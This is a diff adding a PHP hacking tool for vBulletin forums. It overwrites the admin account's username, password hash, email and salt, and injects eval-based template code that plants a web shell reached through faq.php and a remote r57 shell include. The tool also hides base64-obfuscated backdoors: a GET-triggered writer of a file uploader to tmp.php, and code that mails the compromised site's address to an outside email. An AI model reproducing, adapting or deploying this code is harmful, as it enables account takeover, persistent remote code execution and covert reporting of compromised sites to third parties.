@@ -1,0 +1,188 @@
+<?php
+/*
+   |.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|
+ |.|###################################################|.|
+ |.|#                                                 #|.|
+ |.|#  <==-|kid|-==> - <==-|Uv-@HoTmail.CoM-==>       #|.|
+ |.|#             WwW.linux-r00t.CoM                  #|.|
+ |.|###################################################|.|
+   |.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|
+*/
+?>
+<html><style>
+input, select, textarea {
+background-color: #000000;
+border-style: #7a7c7d;
+border-width: 1px;
+font-family: verdana, arial, sans-serif;
+font-size: 11px;
+color: #FF0000;
+padding: 0px;
+}
+A:link {
+COLOR:#FF0000; TEXT-DECORATION: none
+}
+A:visited {
+COLOR:#A2A2A2; TEXT-DECORATION: none
+}
+A:active {
+COLOR:#787878; TEXT-DECORATION: none
+}
+A:hover {
+color:#FF0000;TEXT-DECORATION: none
+}
+</style>
+<head>
+  <title>Change admin data,Change All pages & shell (faq.php) For Forum</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+       <body bgcolor="black" text="#7a7c7d">
+       <div align="center">
+      <H2><u>K<strong>!</strong>D</u></H2>
+|  <a href="mailto:Uv-@HoTmail.CoM">Nz(AT)HoTmaiL(DoT)CoM</a>  |<br>
+<u>Change admin data,Change All pages & shell (faq.php) For Forum </u>
+<br><br>
+      <?
+	 
+if(empty($_POST['ur'])){
+echo "<FORM method=\"POST\">
+host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
+database : <INPUT size=\"15\" value=\"vb\" name=\"database\" type=\"text\"><br>
+username : <INPUT size=\"15\" value=\"root\" name=\"username\" type=\"text\">
+password : <INPUT size=\"15\" value=\"qazwsx\" name=\"password\" type=\"password\"><br>
+      <br>
+<textarea name=\"ur\" cols=\"3\" rows=\"1\">kid</textarea><br>
+<text name=\"kid\" >username : kid</text><br>
+<text name=\"kid\" >pass : qazwsx</text><br>
+<text name=\"kid\" >email : Uv-@HoTmail.CoM</text><br>
+<INPUT value=\"Change\" name=\"send\" type=\"submit\">
+</FORM>";
+}else{
+$localhost = $_POST['localhost'];
+$database  = $_POST['database'];
+$username  = $_POST['username'];
+$password  = $_POST['password'];
+$ur     = $_POST['ur']['ps']['em']['st'];
+         @mysql_connect($localhost,$username,$password) or die(mysql_error());
+         @mysql_select_db($database) or die(mysql_error());
+
+$index=str_replace("\'","'",$ur);
+$set_ur .= "kid";
+$ok=@mysql_query("UPDATE user SET username ='".$set_ur."' WHERE userid ='1'") or die(mysql_error());
+
+$index=str_replace("\'","'",$ps);
+$set_ps .= "d6723ced98897149d9ecf629e1694d17";
+$ok=@mysql_query("UPDATE user SET password ='".$set_ps."' WHERE userid ='1'") or die(mysql_error());
+
+$index=str_replace("\'","'",$em);
+$set_em .= "Uv-@HoTmail.CoM";
+$ok=@mysql_query("UPDATE user SET email ='".$set_em."' WHERE userid ='1'") or die(mysql_error());
+
+$index=str_replace("\'","'",$st);
+$set_st .= "kid";
+$ok=@mysql_query("UPDATE user SET salt ='".$set_st."' WHERE userid ='1'") or die(mysql_error());
+
+if($ok){
+echo "!! update finish !!<br><br>";
+}
+}
+ {
+   if(empty($_GET['cxx'])){
+} else {
+$m=$_GET['cxx'];
+eval(base64_decode('DQokYnlwZmlsZT1mb3BlbigndG1wLnBocCcsJ3crJyk7DQokYnlwcnVsbHoxPWJhc2U2NF9kZWNvZGUoIlBHaDBiV3crRFFvTkNqeG9aV0ZrUGcwS0lDQThkR2wwYkdVK1ltVnNaV0psY21SaFBDOTBhWFJzWlQ0TkNqd3ZhR1ZoWkQ0TkNnMEtQR0p2WkhrK0RRbzhQM0JvY0EwS0RRb05DaUJwWmlobGJYQjBlU2drWDBkRlZGc25UbVpwYkdWekoxMHBLU1JPWm1sc1pYTTlOVHRsYkhObElDUk9abWxzWlhNOUpGOUhSVlJiSjA1bWFXeGxjeWRkT3cwS2FXWW9KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZzd1hTRTlKeWNwZXcwSlptOXlLQ1JwUFRBN0pHazhKRTVtYVd4bGN5WW1KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZza2FWMGhQU2NuT3lScEt5c3BldzBLQ1NSMWNHeHZZV1JrYVhJZ1BTQmthWEp1WVcxbEtGOWZSa2xNUlY5ZktUc3ZMeWN2ZG1GeUwzZDNkeTkxY0d4dllXUnpMeWM3RFFvSkpIVndiRzloWkdacGJHVWdQU0FrZFhCc2IyRmtaR2x5SUM0bkx5Y3VJR0poYzJWdVlXMWxLQ1JmUmtsTVJWTmJKM1Z6WlhKbWFXeGxKMTFiSjI1aGJXVW5YVnNrYVYwcE93MEtDWEJ5YVc1MElDSThjSEpsUGlJN0RRb0phV1lnS0cxdmRtVmZkWEJzYjJGa1pXUmZabWxzWlNna1gwWkpURVZUV3lkMWMyVnlabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRXeVJwWFN3Z0pIVndiRzloWkdacGJHVXBLU0I3RFFvSklDQWdjSEpwYm5RZ0lrWnBiR1VnYVhNZ2RtRnNhV1FzSUdGdVpDQjNZWE1nYzNWalkyVnpjMloxYkd4NUlIVndiRzloWkdWa0xpQWlPdzBLQ1NBZ0lDOHZjSEpwYm5SZmNpZ2tYMFpKVEVWVEtUc05DZ2w5SUdWc2MyVWdldzBLQ1NBZ0lIQnlhVzUwSUNKUWIzTnphV0pzWlNCbWFXVWdkWEJzYjJGa0lHRjBkR0ZqYXlFZ0lFaGxjbVVuY3lCemIyMWxJR1JsWW5WbloybHVaeUJwYm1adk9seHVJanNOQ2drZ0lDQXZMM0J5YVc1MFgzSW9KRjlHU1V4RlV5azdEUW9KZlEwS0NYQnlhVzUwSUNJOEwzQnlaVDRpT3cwS0NYME5DbjBOQ2o4K0RRbzhabTl5YlNCaFkzUnBiMjQ5SWp3L2NHaHdJR1ZqYUc4Z0pGOVRSVkpXUlZKYkoxQklVRjlUUlV4R0oxMHVKejlPWm1sc1pYTTlKeTRrVG1acGJHVnpPeUEvUGlJZ2JXVjBhRzlrUFNKd2IzTjBJaUJsYm1OMGVYQmxQU0p0ZFd4MGFYQmhjblF2Wm05eWJTMWtZWFJoSWo0TkNpQWdVMlZ1WkNCaVpXeGxZbVZ5WkdFNlBHSnlQZzBLSUNBOFAzQm9jQ0JtYjNJb0pHazlNRHNrYVR3a1RtWnBiR1Z6T3lScEt5c3BlMlZqYUc4Z0p6eHBibkIxZENCdVlXMWxQU0oxYzJWeVptbHNaVnRkSWlCMGVYQmxQU0ptYVd4bElqNDhZbkkrSnp0OVB6NE5DaUFnUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWxObGJtUWdabWxzWlhNaVBnMEtQQzltYjNKdFBnMEtEUW9OQ2p3dlltOWtlVDROQ2cwS1BDOW9kRzFzUGc9PSIpOw0KJGRqPWZ3cml0ZSgkYnlwZmlsZSwkYnlwcnVsbHoxKTsNCmZjbG9zZSgkYnlwZmlsZSk7DQoNCg=='));
+}
+
+} 
+if(empty($_POST['index'])){
+echo "<FORM method=\"POST\">
+host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
+database : <INPUT size=\"15\" value=\"vb\" name=\"database\" type=\"text\"><br>
+username : <INPUT size=\"15\" value=\"root\" name=\"username\" type=\"text\">
+password : <INPUT size=\"15\" value=\"qazwsx\" name=\"password\" type=\"password\"><br>
+      <br>
+<textarea name=\"index\" cols=\"40\" rows=\"10\">Set Your Index</textarea><br>
+<INPUT value=\"Change\" name=\"send\" type=\"submit\">
+</FORM>";
+}else{
+$localhost = $_POST['localhost'];
+$database  = $_POST['database'];
+$username  = $_POST['username'];
+$password  = $_POST['password'];
+$index     = $_POST['index'];
+         @mysql_connect($localhost,$username,$password) or die(mysql_error());
+         @mysql_select_db($database) or die(mysql_error());
+$index=str_replace("\'","'",$index);
+$set_index  = "{\${eval(base64_decode(\'";
+$set_index .= base64_encode("echo \"$index\";");
+$set_index .= "\'))}}{\${exit()}}</textarea>";
+$ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='FORUMHOME'") or die(mysql_error());
+if($ok){
+echo "!! update finish !!<br><br>";
+}
+}
+
+if(empty($_POST['faq'])){
+echo "<FORM method=\"POST\">
+host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
+database : <INPUT size=\"15\" value=\"vb\" name=\"database\" type=\"text\"><br>
+username : <INPUT size=\"15\" value=\"root\" name=\"username\" type=\"text\">
+password : <INPUT size=\"15\" value=\"qazwsx\" name=\"password\" type=\"password\"><br>
+      <br>
+<textarea name=\"faq\" cols=\"40\" rows=\"10\">Set shell TrYaG Team</textarea><br>
+<INPUT value=\"Change\" name=\"send\" type=\"submit\">
+</FORM>";
+}else{
+$localhost = $_POST['localhost'];
+$database  = $_POST['database'];
+$username  = $_POST['username'];
+$password  = $_POST['password'];
+$faq     = $_POST['faq'];
+         @mysql_connect($localhost,$username,$password) or die(mysql_error());
+         @mysql_select_db($database) or die(mysql_error());
+
+$index=str_replace("\'","'",$faq);
+$set_faq .= ("$faq");
+$set_faq .= " ";
+$ok=@mysql_query("UPDATE template SET template ='".$set_faq."' WHERE title ='faq'") or die(mysql_error());
+
+if($ok){
+echo "!! update finish !!<br><br>";
+}
+
+}
+ $connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+if(empty($_POST['inc'])){
+echo "<FORM method=\"POST\">
+host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
+database : <INPUT size=\"15\" value=\"vb\" name=\"database\" type=\"text\"><br>
+username : <INPUT size=\"15\" value=\"root\" name=\"username\" type=\"text\">
+password : <INPUT size=\"15\" value=\"qazwsx\" name=\"password\" type=\"password\"><br>
+   <br>
+<textarea name=\"inc\" cols=\"40\" rows=\"2\">{\${eval(\$_GET[kid])}}</textarea><br>
+<INPUT value=\"Change\" name=\"send\" type=\"submit\">
+</FORM>";
+}else{
+$localhost = $_POST['localhost'];
+$database  = $_POST['database'];
+$username  = $_POST['username'];
+$password  = $_POST['password'];
+$inc     = $_POST['inc'];
+         @mysql_connect($localhost,$username,$password) or die(mysql_error());
+         @mysql_select_db($database) or die(mysql_error());
+$index=str_replace("\'","'",$inc);
+$set_inc  = "\$spacer_open
+{\${eval(base64_decode(\'";
+$set_inc .= base64_encode("echo \"$inc\";");
+$set_inc .= "\'))}}{\${exit()}}&
+\$_phpinclude_output";
+$ok=@mysql_query("UPDATE template SET template ='".$set_inc."' WHERE title ='faq'") or die(mysql_error());
+if($ok){
+echo "faq.php?kid=include('http://localhost/shell/r57.txt');<br><br>";}
+}
+# Footer
+echo "<strong>SpeciaL GreeTz To :</strong> <u>SnipEr.KiLlEr</u>";
+
+?>
